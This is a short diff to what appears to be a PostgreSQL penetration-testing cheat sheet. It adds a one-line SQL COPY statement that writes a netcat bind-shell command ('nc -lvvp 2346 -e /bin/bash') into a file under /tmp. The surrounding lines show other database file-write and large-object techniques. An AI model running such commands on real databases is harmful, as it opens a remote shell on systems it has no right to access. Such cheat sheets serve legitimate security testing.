@@ -184,6 +184,11 @@ SELECT * FROM pentestlab;
 COPY pentestlab(t) TO '/tmp/pentestlab';
 ```
 
+Or as one line:
+```sql
+COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
+```
+
 ```sql
 SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
 SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
